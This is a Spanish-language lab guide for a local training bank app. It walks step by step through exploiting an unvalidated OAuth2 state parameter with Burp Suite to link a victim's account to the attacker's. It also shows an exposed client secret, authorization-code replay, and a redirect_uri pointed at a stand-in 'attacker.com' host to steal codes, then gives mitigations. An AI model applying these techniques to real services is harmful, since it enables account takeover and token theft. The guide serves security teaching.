# 🎯 GUÍA PRÁCTICA - EXPLOTACIÓN OAUTH2 CSRF

## 📑 Tabla de Contenidos

1. [Introducción al Desafío](#introducción)
2. [Configuración del Entorno](#configuración)
3. [Fase 1: Reconocimiento](#reconocimiento)
4. [Fase 2: Captura del State](#captura-state)
5. [Fase 3: Ataque CSRF](#ataque-csrf)
6. [Fase 4: Verificación](#verificación)
7. [Análisis Técnico](#análisis-técnico)
8. [Otras Vulnerabilidades OAuth](#otras-vulnerabilidades)
9. [Mitigaciones](#mitigaciones)

---

## 🎓 Introducción al Desafío {#introducción}

### ¿Qué vas a aprender?

En este desafío práctico aprenderás a:
- ✅ Identificar vulnerabilidades CSRF en implementaciones OAuth2
- ✅ Usar Burp Suite para interceptar y manipular tráfico HTTP
- ✅ Explotar la falta de validación del parámetro `state`
- ✅ Realizar un ataque de "Account Linking Hijacking"
- ✅ Documentar hallazgos de seguridad con evidencias

### Escenario

**Víctima:** María López - Empleada de RR.HH. del Banco Nacional
- Tiene acceso a información confidencial de empleados
- Salarios, bonificaciones, evaluaciones de desempeño
- Datos personales sensibles

**Atacante:** Tú - Pentester contratado para auditar la seguridad
- Cuenta Google de prueba: `test@google.com` / `test123`
- Objetivo: Demostrar cómo un atacante real podría comprometer cuentas

### Vulnerabilidad Target

**CWE-352: Cross-Site Request Forgery (CSRF)**
- **Ubicación:** Flujo OAuth2 del Banco Nacional
- **Componente vulnerable:** Parámetro `state` no validado
- **CVSS Score:** 8.1 (High)
- **Impacto:** Acceso no autorizado a cuentas bancarias

---

## 🛠️ Configuración del Entorno {#configuración}

### Requisitos Previos

```bash
✅ Docker instalado y corriendo
✅ Burp Suite Community Edition
✅ Navegador con configuración de proxy
✅ (Opcional) Navegador adicional en modo incógnito
```

### Paso 1: Iniciar los Servicios

```bash
# Navegar al directorio del proyecto
cd "c:\Users\maxim\Downloads\TPI SDS\Rama de Titon\TPI-SDS"

# Iniciar Docker (si está configurado)
cd docker
docker-compose up -d --build

# O ejecutar directamente (sin Docker)
cd ..
python app_banco.py
```

**Verificar que el servidor esté corriendo:**
- Banco: http://127.0.0.1:5000
- Enunciados: http://127.0.0.1:5001 (si está corriendo)

### Paso 2: Configurar Burp Suite

#### Instalación de Burp Suite

1. Descargar de: https://portswigger.net/burp/communitydownload
2. Instalar y ejecutar
3. Crear un proyecto temporal

#### Configuración del Proxy

**En Burp Suite:**
```
1. Ir a: Proxy → Options
2. Verificar que esté escuchando en: 127.0.0.1:8080
3. Activar: "Intercept is on" (en la pestaña Intercept)
```

**En el Navegador (Chrome/Firefox):**

*Método Manual:*
```
1. Settings → Network Settings → Manual Proxy Configuration
2. HTTP Proxy: 127.0.0.1
3. Port: 8080
4. Marcar: Use this proxy server for all protocols
5. Save
```

*Método con Extensión:*
```
Instalar: FoxyProxy (Firefox) o SwitchyOmega (Chrome)
Agregar perfil con:
- Proxy IP: 127.0.0.1
- Puerto: 8080
```

#### Instalar Certificado CA de Burp

```
1. Con el proxy activo, navegar a: http://burpsuite
2. Click en "CA Certificate"
3. Instalar el certificado en el navegador:
   - Firefox: Settings → Privacy & Security → Certificates → Import
   - Chrome: Settings → Privacy and Security → Security → Manage Certificates → Import
4. Marcar como "Trust this CA to identify websites"
```

### Paso 3: Verificar Configuración

```bash
# Test 1: Acceder al banco
http://127.0.0.1:5000

# Test 2: Verificar que Burp intercepta
# Con "Intercept is on", deberías ver las peticiones en Burp

# Test 3: Login de prueba
Usuario: julian
Contraseña: juli123
```

---

## 🔍 Fase 1: Reconocimiento {#reconocimiento}

### Objetivo
Entender el flujo OAuth2 normal antes de explotarlo.

### Paso 1.1 - Explorar el Banco

1. **Navegar a:** http://127.0.0.1:5000
2. **Observar opciones de login:**
   - Login tradicional (usuario/contraseña)
   - **"Iniciar sesión con Google"** ← Este es nuestro objetivo

### Paso 1.2 - Probar OAuth Normal (sin interceptar)

**Desactiva Burp temporalmente** para ver el flujo completo:

```
1. Click en "Iniciar sesión con Google"
2. Observar la URL: /oauth/google/authorize?client_id=...&state=...
3. Login con: test@google.com / test123
4. Pantalla de consentimiento: "Permitir"
5. Redirect al dashboard del banco
```

**📝 Anotar:**
- ¿Qué parámetros se envían en la URL?
- ¿Aparece un parámetro `state`?
- ¿Cómo se ve el código de autorización en el callback?

### Paso 1.3 - Buscar Información Sensible Expuesta

**Explorar endpoints comunes:**
```
http://127.0.0.1:5000/oauth/info       ← ⚠️ Vulnerabilidad 2
http://127.0.0.1:5000/oauth/docs
http://127.0.0.1:5000/api/docs
```

**En `/oauth/info` encontrarás:**
```
CLIENT_ID: banco-app-123456
CLIENT_SECRET: SECRET_SUPER_SECRETO_EXPUESTO_123  ← ⚠️ EXPUESTO
JWT_SECRET: jwt_secret_debil
```

**📸 Screenshot 1:** Captura de `/oauth/info` mostrando credenciales expuestas

---

## 🎯 Fase 2: Captura del State del Atacante {#captura-state}

### Objetivo
Iniciar un flujo OAuth con tu cuenta y capturar el parámetro `state`.

### Paso 2.1 - Activar Interceptación en Burp

```
1. Burp Suite → Proxy → Intercept
2. Verificar que esté: "Intercept is on"
3. En el navegador, refrescar la página del banco
```

### Paso 2.2 - Iniciar Flujo OAuth del Atacante

**En el navegador:**
```
1. Ir a: http://127.0.0.1:5000
2. Click en: "Iniciar sesión con Google"
```

**Burp interceptará:**
```http
GET /oauth/init HTTP/1.1
Host: 127.0.0.1:5000
```

**Acción:** Click en **"Forward"**

### Paso 2.3 - Capturar la Autorización Inicial

**Burp interceptará:**
```http
GET /oauth/google/authorize?client_id=banco-app-123456&redirect_uri=http://127.0.0.1:5000/oauth/callback&state=&scope=&response_type=code HTTP/1.1
```

**⚠️ OBSERVAR:** El `state` está **VACÍO** (`state=`)

**Acción:** Click en **"Forward"**

### Paso 2.4 - Login con Tu Cuenta

**Burp interceptará el POST de login:**
```http
POST /oauth/google/login?... HTTP/1.1
Content-Type: application/x-www-form-urlencoded

email=test%40google.com&password=test123&...
```

**📝 Anotar:** Estás usando `test@google.com` (la cuenta del atacante)

**Acción:** Click en **"Forward"** hasta llegar a la pantalla de consentimiento

### Paso 2.5 - Pantalla de Consentimiento

Verás la pantalla: **"Banco Nacional solicita acceso a tu cuenta de Google"**

**⚠️ NO HAGAS CLIC EN "PERMITIR" TODAVÍA**

### Paso 2.6 - Modificar el State (CRÍTICO)

**Ahora haz clic en "Permitir"**

**Burp interceptará:**
```http
POST /oauth/google/consent HTTP/1.1
Host: localhost:5000
Content-Type: application/x-www-form-urlencoded

redirect_uri=http%3A%2F%2F127.0.0.1%3A5000%2Foauth%2Fcallback&state=&client_id=banco-app-123456&scope=
```

**MODIFICAR EL REQUEST:**
```http
POST /oauth/google/consent HTTP/1.1
Host: localhost:5000
Content-Type: application/x-www-form-urlencoded

redirect_uri=http%3A%2F%2F127.0.0.1%3A5000%2Foauth%2Fcallback&state=ATACANTE_12345&client_id=banco-app-123456&scope=profile+email
```

**Cambios realizados:**
- ✅ `state=` → `state=ATACANTE_12345`
- ✅ `scope=` → `scope=profile+email`

### Paso 2.7 - Guardar el Request

```
1. Click derecho en el request
2. "Send to Repeater"
3. Guardar el valor del state: ATACANTE_12345
```

**⚠️ IMPORTANTE:** Ahora haz **"Drop"** (descartar) este request. No queremos completar nuestro propio flujo todavía.

**📸 Screenshot 2:** Captura de Burp mostrando el POST modificado con `state=ATACANTE_12345`

---

## 🎯 Fase 3: Ataque CSRF (Account Linking Hijacking) {#ataque-csrf}

### Objetivo
Hacer que María complete TU flujo OAuth usando TU state.

### Paso 3.1 - Preparar Sesión de la Víctima

**Opción A: Navegador Incógnito**
```
1. Abrir ventana de incógnito/privada
2. Ir a: http://127.0.0.1:5000
3. Esta será la sesión de María
```

**Opción B: Otro Navegador**
```
Usar un navegador diferente (Firefox si usaste Chrome)
```

### Paso 3.2 - María Inicia Sesión en el Banco (Opcional)

Si el desafío requiere que María esté autenticada primero:
```
Usuario: maria.lopez@banco.com
Contraseña: maria123
```

### Paso 3.3 - María Inicia OAuth

**En la ventana de María:**
```
1. Click en "Iniciar sesión con Google"
2. Burp interceptará las peticiones
```

**Login de María en Google:**
```
Email: usuario@google.com
Password: google123
```

**⚠️ IMPORTANTE:** Usar `usuario@google.com` (cuenta de María), NO `test@google.com`

**Acción:** Forward en Burp hasta llegar a la pantalla de consentimiento de María

### Paso 3.4 - Interceptar el Consent de María

**María hace clic en "Permitir"**

**Burp interceptará:**
```http
POST /oauth/google/consent HTTP/1.1
Host: localhost:5000
Cookie: session=<SESSION_DE_MARIA>
Content-Type: application/x-www-form-urlencoded

redirect_uri=http%3A%2F%2F127.0.0.1%3A5000%2Foauth%2Fcallback&state=MARIA_STATE_789&client_id=banco-app-123456&scope=profile+email
```

**Observar:**
- Cookie de María: `session=<SESSION_DE_MARIA>`
- State de María: `state=MARIA_STATE_789`

### Paso 3.5 - EJECUTAR EL ATAQUE (Reemplazar State)

**MODIFICAR EL REQUEST EN BURP:**
```http
POST /oauth/google/consent HTTP/1.1
Host: localhost:5000
Cookie: session=<SESSION_DE_MARIA>  ← ⚠️ MANTENER COOKIE DE MARÍA
Content-Type: application/x-www-form-urlencoded

redirect_uri=http%3A%2F%2F127.0.0.1%3A5000%2Foauth%2Fcallback&state=ATACANTE_12345&client_id=banco-app-123456&scope=profile+email
```

**Cambio crítico:**
- ❌ `state=MARIA_STATE_789` (original de María)
- ✅ `state=ATACANTE_12345` (state del atacante)

**📸 Screenshot 3:** Burp mostrando el state de María siendo reemplazado

### Paso 3.6 - Forward y Capturar el Código

**Click en "Forward"**

**Burp interceptará el redirect:**
```http
GET /oauth/callback?code=DPNWZ_dOc4hR32csVTdIZQ&state=ATACANTE_12345 HTTP/1.1
Host: 127.0.0.1:5000
Cookie: session=<SESSION_DE_MARIA>
```

**🎯 ¡ÉXITO! Observar:**
- ✅ `code=DPNWZ_dOc4hR32csVTdIZQ` → Código de autorización
- ✅ `state=ATACANTE_12345` → Tu state (no validado)
- ✅ `Cookie: session=<SESSION_DE_MARIA>` → Sesión de María

### Paso 3.7 - Copiar el Código de Autorización

**COPIAR EXACTAMENTE:**
```
DPNWZ_dOc4hR32csVTdIZQ
```

**📸 Screenshot 4:** Callback mostrando el código de autorización con tu state

**Este código es la evidencia de la explotación exitosa.**

---

## ✅ Fase 4: Verificación {#verificación}

### Paso 4.1 - Verificar en la Interfaz del Desafío

```
1. Ir a: http://127.0.0.1:5001/desafio/oauth
2. Ingresar el código: DPNWZ_dOc4hR32csVTdIZQ
3. Click en "Verificar"
```

**Respuesta esperada:**
```json
{
  "success": true,
  "mensaje": "¡Felicitaciones! Has explotado la vulnerabilidad CSRF.",
  "detalle": "Demostraste que el parámetro state NO se valida correctamente..."
}
```

**📸 Screenshot 5:** Pantalla de verificación exitosa

### Paso 4.2 - Verificar el Acceso (Opcional)

**Probar que ahora puedes acceder como María:**

```
1. En un navegador limpio (sin sesiones activas)
2. Ir a: http://127.0.0.1:5000
3. Click en "Iniciar sesión con Google"
4. Login con: test@google.com / test123 (TU cuenta)
5. Permitir acceso
```

**Resultado esperado:**
- El banco te autentica
- Accedes al dashboard de María
- Puedes ver su información confidencial

**📸 Screenshot 6:** Dashboard mostrando información de María accedida con tu cuenta Google

---

## 🔬 Análisis Técnico {#análisis-técnico}

### ¿Por Qué Funciona Este Ataque?

#### Flujo Normal (Seguro) vs Flujo Atacado (Vulnerable)

**Flujo Normal:**
```
Usuario → Login Google → State ABC (generado para Usuario)
       ↓
    Consent → Callback con State ABC
       ↓
    Validación: State ABC == Session[Usuario].state ✅
       ↓
    Acceso concedido al Usuario
```

**Flujo Atacado:**
```
Atacante → Login Google (test@google.com) → State ATACANTE_12345
    ↓ (Drop - no completa)

María → Login Banco → Login Google (usuario@google.com)
    ↓
Atacante intercepta Consent de María
    ↓
Reemplaza: State MARIA → State ATACANTE_12345
    ↓
Callback con State ATACANTE_12345 en sesión de María
    ↓
❌ NO HAY VALIDACIÓN: State ATACANTE_12345 != Session[María].state
    ↓
Cuenta de María vinculada a test@google.com (atacante)
```

### Código Vulnerable

**Ubicación:** `app_banco.py` líneas ~434-505

```python
@app.route('/oauth/google/consent', methods=['POST'])
def oauth_google_consent():
    # ...
    state = request.form.get('state', '')
    user_email = session.get('google_user_email')
    
    # ❌ VULNERABLE: NO VALIDA EL STATE
    # Acepta cualquier state sin verificar que pertenezca
    # a la sesión actual
    
    # Genera código de autorización
    code = secrets.token_urlsafe(16)
    authorization_codes[code] = {
        'user_info': user_info,
        # ...
    }
    
    # Redirige con el código
    return redirect(f"{redirect_uri}?code={code}&state={state}")

@app.route('/oauth/callback')
def oauth_callback():
    code = request.args.get('code')
    state = request.args.get('state', '')
    
    # ❌ VULNERABLE: TAMPOCO VALIDA EL STATE AQUÍ
    # No verifica que el state pertenezca a la sesión actual
    
    # Vincula la cuenta OAuth a la sesión actual (de María)
    session['oauth_token'] = access_token
    session['oauth_email'] = user_info['email']  # test@google.com
    
    return redirect('/dashboard')  # Dashboard de María
```

### Código Seguro (Mitigación)

```python
import secrets
import time

@app.route('/oauth/init')
def oauth_init():
    # ✅ Generar state único y seguro
    state = secrets.token_urlsafe(32)
    
    # ✅ Guardar en la sesión
    session['oauth_state'] = state
    session['oauth_state_timestamp'] = time.time()
    session['oauth_state_ip'] = request.remote_addr
    
    auth_url = f"...&state={state}..."
    return redirect(auth_url)

@app.route('/oauth/google/consent', methods=['POST'])
def oauth_google_consent():
    state = request.form.get('state', '')
    
    # ✅ VALIDACIÓN 1: State existe en la sesión
    if 'oauth_state' not in session:
        abort(403, "No OAuth flow in progress")
    
    # ✅ VALIDACIÓN 2: State coincide
    if state != session.get('oauth_state'):
        abort(403, "Invalid state - CSRF detected!")
    
    # ✅ VALIDACIÓN 3: State no expiró (5 min)
    if time.time() - session.get('oauth_state_timestamp', 0) > 300:
        abort(403, "State expired")
    
    # ✅ VALIDACIÓN 4: IP coincide (opcional)
    if request.remote_addr != session.get('oauth_state_ip'):
        abort(403, "State from different IP")
    
    # Generar código solo si las validaciones pasan
    code = secrets.token_urlsafe(16)
    # ...
    
    # ✅ Marcar state como usado
    session.pop('oauth_state', None)
    
    return redirect(f"{redirect_uri}?code={code}&state={state}")

@app.route('/oauth/callback')
def oauth_callback():
    state = request.args.get('state', '')
    
    # ✅ Validar state también en el callback
    # (aunque ya debería haberse validado en consent)
    if state != session.get('oauth_state_expected'):
        abort(403, "Invalid state in callback")
    
    # Procesar código...
    session.pop('oauth_state_expected', None)
```

### Métricas de Seguridad

| Aspecto | Implementación Vulnerable | Implementación Segura |
|---------|--------------------------|----------------------|
| **Generación de State** | ❌ Vacío o no existe | ✅ `secrets.token_urlsafe(32)` |
| **Almacenamiento** | ❌ No se guarda en sesión | ✅ `session['oauth_state']` |
| **Validación en Consent** | ❌ No se valida | ✅ Verifica contra sesión |
| **Validación en Callback** | ❌ No se valida | ✅ Doble verificación |
| **Expiración** | ❌ No expira | ✅ 5 minutos |
| **Un solo uso** | ❌ Reutilizable | ✅ `session.pop()` después de usar |
| **Binding de IP** | ❌ No verifica | ✅ Opcional pero recomendado |

---

## 🎯 Otras Vulnerabilidades OAuth del Banco {#otras-vulnerabilidades}

### Vulnerabilidad #2: Client Secret Expuesto

**Descripción:**
El `CLIENT_SECRET` está expuesto públicamente en `/oauth/info`.

**Explotación:**
```bash
# Paso 1: Obtener el secret
curl http://127.0.0.1:5000/oauth/info

# Paso 2: Usar el secret para obtener tokens directamente
curl -X POST http://127.0.0.1:5000/oauth/google/token \
  -H "Content-Type: application/json" \
  -d '{
    "code": "CODIGO_DE_AUTORIZACION",
    "client_id": "banco-app-123456",
    "client_secret": "SECRET_SUPER_SECRETO_EXPUESTO_123"
  }'
```

**Impacto:**
- Bypass completo del flujo OAuth
- Suplantación de la aplicación
- Obtención de tokens sin autorización

**CVSS:** 9.8 (Critical)

### Vulnerabilidad #3: Reutilización de Códigos de Autorización

**Descripción:**
Los códigos de autorización NO se invalidan después de usarlos.

**Explotación:**
```
1. Completar un flujo OAuth normal
2. Capturar el código de autorización en el callback
3. Usar el MISMO código múltiples veces para obtener nuevos tokens
```

**Código de prueba:**
```http
GET /oauth/callback?code=ABC123&state=...
# Primera vez: ✅ Funciona

GET /oauth/callback?code=ABC123&state=...
# Segunda vez: ⚠️ ¡También funciona! (Vulnerable)
```

**Impacto:**
- Replay attacks
- Acceso múltiple no autorizado
- Tokens duplicados

**CVSS:** 7.5 (High)

### Vulnerabilidad #4: Redirect URI No Validado

**Descripción:**
El `redirect_uri` acepta múltiples valores sin validación estricta.

**Explotación:**
```
Modificar el redirect_uri para apuntar a un servidor controlado por el atacante:

redirect_uri=http://attacker.com/steal?
```

**Impacto:**
- Interceptación de códigos de autorización
- Phishing
- Robo de tokens

**CVSS:** 8.2 (High)

### Vulnerabilidad #5: Information Disclosure en Token Endpoint

**Descripción:**
El endpoint `/oauth/google/token` expone información sensible del usuario.

**Respuesta vulnerable:**
```json
{
  "access_token": "eyJ...",
  "user_info": {
    "user_id": "g_001",
    "email": "usuario@google.com",
    "name": "Usuario Google"
  }
}
```

**Debería ser:**
```json
{
  "access_token": "eyJ...",
  "token_type": "Bearer",
  "expires_in": 3600
}
```

**CVSS:** 5.3 (Medium)

---

## 🛡️ Mitigaciones Recomendadas {#mitigaciones}

### Checklist de Seguridad OAuth2

#### Nivel Crítico ⚠️

- [ ] **Validar state en TODAS las fases del flujo**
  ```python
  if state != session.get('oauth_state'):
      abort(403, "Invalid state")
  ```

- [ ] **Usar state criptográficamente seguro**
  ```python
  state = secrets.token_urlsafe(32)  # No usar UUIDs simples
  ```

- [ ] **Invalidar códigos después del primer uso**
  ```python
  if code in authorization_codes:
      # Usar código
      del authorization_codes[code]  # Eliminar inmediatamente
  ```

- [ ] **NUNCA exponer CLIENT_SECRET**
  ```python
  # Usar variables de entorno
  CLIENT_SECRET = os.environ.get('OAUTH_CLIENT_SECRET')
  # Nunca en código fuente ni endpoints públicos
  ```

#### Nivel Alto 🔶

- [ ] **Validar redirect_uri contra whitelist**
  ```python
  ALLOWED_REDIRECTS = [
      "http://127.0.0.1:5000/oauth/callback"
  ]
  if redirect_uri not in ALLOWED_REDIRECTS:
      abort(400, "Invalid redirect_uri")
  ```

- [ ] **Implementar expiración de state (5-10 min)**
  ```python
  if time.time() - state_timestamp > 300:
      abort(403, "State expired")
  ```

- [ ] **Usar PKCE (Proof Key for Code Exchange)**
  ```python
  code_verifier = secrets.token_urlsafe(32)
  code_challenge = base64.urlsafe_b64encode(
      hashlib.sha256(code_verifier.encode()).digest()
  ).decode().rstrip('=')
  ```

#### Nivel Medio 🟡

- [ ] **Logging y monitoreo de flujos OAuth**
  ```python
  logger.info(f"OAuth flow: user={user_id}, state={state}, ip={ip}")
  ```

- [ ] **Rate limiting en endpoints OAuth**
  ```python
  @limiter.limit("10 per minute")
  @app.route('/oauth/init')
  ```

- [ ] **Binding de state a IP del usuario**
  ```python
  session['oauth_state_ip'] = request.remote_addr
  ```

### Implementación Completa Segura

```python
import os
import secrets
import hashlib
import time
from functools import wraps

# Configuración desde variables de entorno
CLIENT_ID = os.environ.get('OAUTH_CLIENT_ID')
CLIENT_SECRET = os.environ.get('OAUTH_CLIENT_SECRET')
REDIRECT_URI_WHITELIST = [
    os.environ.get('OAUTH_REDIRECT_URI')
]

# Rate limiting
oauth_attempts = {}

def rate_limit_oauth(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        ip = request.remote_addr
        key = f"{ip}:{f.__name__}"
        
        if key in oauth_attempts:
            attempts, timestamp = oauth_attempts[key]
            if time.time() - timestamp < 60:  # 1 minuto
                if attempts >= 10:
                    abort(429, "Too many requests")
                oauth_attempts[key] = (attempts + 1, timestamp)
            else:
                oauth_attempts[key] = (1, time.time())
        else:
            oauth_attempts[key] = (1, time.time())
        
        return f(*args, **kwargs)
    return decorated_function

@app.route('/oauth/init')
@rate_limit_oauth
def oauth_init():
    # Generar state seguro
    state = secrets.token_urlsafe(32)
    
    # PKCE
    code_verifier = secrets.token_urlsafe(32)
    code_challenge = base64.urlsafe_b64encode(
        hashlib.sha256(code_verifier.encode()).digest()
    ).decode().rstrip('=')
    
    # Guardar en sesión con metadatos
    session['oauth_state'] = state
    session['oauth_state_timestamp'] = time.time()
    session['oauth_state_ip'] = request.remote_addr
    session['oauth_code_verifier'] = code_verifier
    session['oauth_flow_id'] = secrets.token_hex(16)
    
    # Logging
    logger.info(f"OAuth init: flow_id={session['oauth_flow_id']}, ip={request.remote_addr}")
    
    # Construir URL
    auth_url = (
        f"{GOOGLE_AUTH_URL}?"
        f"client_id={CLIENT_ID}&"
        f"redirect_uri={REDIRECT_URI_WHITELIST[0]}&"
        f"state={state}&"
        f"code_challenge={code_challenge}&"
        f"code_challenge_method=S256&"
        f"response_type=code&"
        f"scope=email profile"
    )
    
    return redirect(auth_url)

@app.route('/oauth/callback')
@rate_limit_oauth
def oauth_callback():
    code = request.args.get('code')
    state = request.args.get('state')
    
    # Validaciones completas
    if not state or state != session.get('oauth_state'):
        logger.warning(f"CSRF attempt: state mismatch, ip={request.remote_addr}")
        abort(403, "Invalid state - CSRF detected")
    
    if time.time() - session.get('oauth_state_timestamp', 0) > 300:
        logger.warning(f"Expired state: flow_id={session.get('oauth_flow_id')}")
        abort(403, "State expired")
    
    if request.remote_addr != session.get('oauth_state_ip'):
        logger.warning(f"IP mismatch: expected={session.get('oauth_state_ip')}, got={request.remote_addr}")
        abort(403, "State from different IP")
    
    # Limpiar state (un solo uso)
    session.pop('oauth_state', None)
    session.pop('oauth_state_timestamp', None)
    session.pop('oauth_state_ip', None)
    
    # Intercambiar código por token (con PKCE)
    # ...
    
    logger.info(f"OAuth success: flow_id={session.get('oauth_flow_id')}, user={user_email}")
    
    return redirect('/dashboard')
```

---

## 📚 Referencias y Recursos

### Especificaciones OAuth2

- **RFC 6749 - OAuth 2.0 Authorization Framework**
  https://datatracker.ietf.org/doc/html/rfc6749

- **RFC 6819 - OAuth 2.0 Threat Model and Security Considerations**
  https://datatracker.ietf.org/doc/html/rfc6819

- **OAuth 2.0 Security Best Current Practice**
  https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics

### Guías de Seguridad

- **OWASP OAuth 2.0 Cheat Sheet**
  https://cheatsheetseries.owasp.org/cheatsheets/OAuth2_Cheat_Sheet.html

- **OWASP Authentication Cheat Sheet**
  https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html

### Herramientas

- **Burp Suite Community Edition**
  https://portswigger.net/burp/communitydownload

- **OAuth 2.0 Debugger**
  https://oauthdebugger.com/

- **JWT.io**
  https://jwt.io/

### CVE Relacionados

- **CVE-2020-11072** - OAuth CSRF in Google Sign-In
- **CVE-2019-11324** - OAuth State Parameter Bypass
- **CVE-2018-18809** - Redirect URI Validation Bypass

---

## 📝 Checklist Final del Desafío

Antes de considerar el desafío completado:

### Evidencias Requeridas

- [ ] Screenshot 1: Página `/oauth/info` con credenciales expuestas
- [ ] Screenshot 2: Burp mostrando POST consent con `state=ATACANTE_12345`
- [ ] Screenshot 3: Burp mostrando el state de María siendo reemplazado
- [ ] Screenshot 4: Callback con código de autorización
- [ ] Screenshot 5: Verificación exitosa en la interfaz
- [ ] Screenshot 6: Dashboard de María accedido con cuenta del atacante (opcional)

### Documentación

- [ ] Descripción del ataque ejecutado
- [ ] Código vulnerable identificado (app_banco.py líneas)
- [ ] Código de autorización obtenido
- [ ] Explicación del impacto
- [ ] Propuestas de mitigación
- [ ] CVSS score calculado (8.1 - High)

### Comprensión Técnica

- [ ] Entiendo qué es el parámetro `state` en OAuth2
- [ ] Sé por qué se necesita validación del `state`
- [ ] Puedo explicar cómo funciona Account Linking Hijacking
- [ ] Identifico las 5 vulnerabilidades OAuth del banco
- [ ] Sé cómo mitigar cada vulnerabilidad

---

## 🎓 Conclusión

Has completado exitosamente el desafío de explotación OAuth2 CSRF. Ahora tienes:

✅ **Conocimientos prácticos** de vulnerabilidades OAuth2 reales
✅ **Experiencia con Burp Suite** para análisis de seguridad
✅ **Habilidades de pentesting** aplicables a aplicaciones reales
✅ **Comprensión de mitigaciones** para proteger tus propias aplicaciones

### Próximos Pasos

1. **Explorar las otras 4 vulnerabilidades OAuth** del banco
2. **Practicar con OAuth 2.0 Playground** (https://www.oauth.com/playground/)
3. **Revisar implementaciones OAuth** en proyectos open source
4. **Contribuir a la seguridad** reportando vulnerabilidades responsablemente

---

**⚠️ DISCLAIMER DE RESPONSABILIDAD**

Este desafío es únicamente para propósitos educativos en un entorno controlado. 

**NUNCA:**
- ❌ Uses estas técnicas en sistemas reales sin autorización explícita
- ❌ Ataques aplicaciones de producción
- ❌ Accedas a cuentas de terceros sin permiso

**El acceso no autorizado a sistemas informáticos es un delito** en la mayoría de jurisdicciones.

**SIEMPRE:**
- ✅ Obtén autorización por escrito antes de realizar pruebas de seguridad
- ✅ Respeta los programas de Bug Bounty y sus reglas
- ✅ Reporta vulnerabilidades de manera responsable

---

**Creado por:** Equipo de Seguridad - Banco Nacional (Entorno de Pruebas)
**Última actualización:** Noviembre 2025
**Versión:** 2.0
